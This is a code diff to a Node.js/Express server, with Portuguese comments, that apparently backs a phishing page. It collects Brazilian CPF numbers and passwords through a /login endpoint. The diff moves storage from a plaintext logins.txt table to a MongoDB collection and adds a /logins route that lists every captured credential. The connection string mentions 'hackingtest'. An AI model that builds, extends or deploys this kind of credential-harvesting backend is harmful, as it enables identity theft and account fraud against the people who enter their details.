@@ -1,68 +1,64 @@
 const express = require('express');
 const path = require('path');
 const bodyParser = require('body-parser');
-const fs = require('fs');
+const mongoose = require('mongoose');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const filePath = path.join(__dirname, 'logins.txt');
+// Conecte aqui sua string do MongoDB Atlas (troque <usuario>, <senha>, <banco>)
+const mongoURI = 'mongodb+srv://<dansaraiva23>:<@hackingtest.pf4jqlh.mongodb.net>@cluster0.abcdef.mongodb.net/<banco>?retryWrites=true&w=majority';
 
-// Cria o arquivo com cabeçalho se não existir
-if (!fs.existsSync(filePath)) {
-  const header = `CPF              | SENHA           \n` +
-                 `-----------------|-----------------\n`;
+mongoose.connect(mongoURI, {
+  useNewUrlParser: true,
+  useUnifiedTopology: true,
+}).then(() => {
+  console.log('Conectado ao MongoDB Atlas!');
+}).catch((err) => {
+  console.error('Erro ao conectar no MongoDB:', err);
+});
+
+// Definindo schema e modelo
+const loginSchema = new mongoose.Schema({
+  cpf: { type: String, required: true },
+  senha: { type: String, required: true },
+});
+
+const Login = mongoose.model('Login', loginSchema);
+
+// Rota para salvar login no MongoDB
+app.post('/login', async (req, res) => {
   try {
-    fs.writeFileSync(filePath, header);
-    console.log('Arquivo logins.txt criado com cabeçalho.');
-  } catch (err) {
-    console.error('Erro ao criar o arquivo logins.txt:', err);
-  }
-}
-
-app.post('/login', (req, res) => {
-  try {
-    console.log('Requisição recebida:', req.body);
-
     const { cpf, senha } = req.body;
 
     if (!cpf || !senha) {
       return res.status(400).json({ message: 'CPF e senha são obrigatórios.' });
     }
 
-    const cpfStr = String(cpf);
-    const senhaStr = String(senha);
-    const linha = `${cpfStr.padEnd(17)}| ${senhaStr.padEnd(17)}\n`;
+    const novoLogin = new Login({ cpf, senha });
+    await novoLogin.save();
 
-    fs.appendFile(filePath, linha, (err) => {
-      if (err) {
-        console.error('Erro ao salvar os dados:', err);
-        return res.status(500).json({ message: 'Erro ao salvar os dados.' });
-      }
-
-      console.log('Dados salvos com sucesso:', linha.trim());
-      return res.json({ message: 'Login salvo com sucesso!' });
-    });
+    console.log('Login salvo:', novoLogin);
+    return res.json({ message: 'Login salvo com sucesso!' });
   } catch (error) {
-    console.error('Erro inesperado:', error);
+    console.error('Erro ao salvar login:', error);
     return res.status(500).json({ message: 'Erro inesperado no servidor.' });
   }
 });
 
-// Rota para testar escrita no arquivo manualmente
-app.get('/teste', (req, res) => {
-  fs.appendFile(filePath, 'Linha de teste\n', (err) => {
-    if (err) {
-      console.error('Erro ao escrever no arquivo:', err);
-      return res.status(500).send('Erro ao escrever no arquivo');
-    }
-    res.send('Escrita OK');
-  });
+// Rota de teste para listar logins
+app.get('/logins', async (req, res) => {
+  try {
+    const logins = await Login.find();
+    res.json(logins);
+  } catch (error) {
+    res.status(500).json({ message: 'Erro ao buscar logins' });
+  }
 });
 
 app.listen(PORT, () => {
-  console.log(`Servidor rodando em: http://localhost:${PORT}`);
+  console.log(`Servidor rodando na porta ${PORT}`);
 });
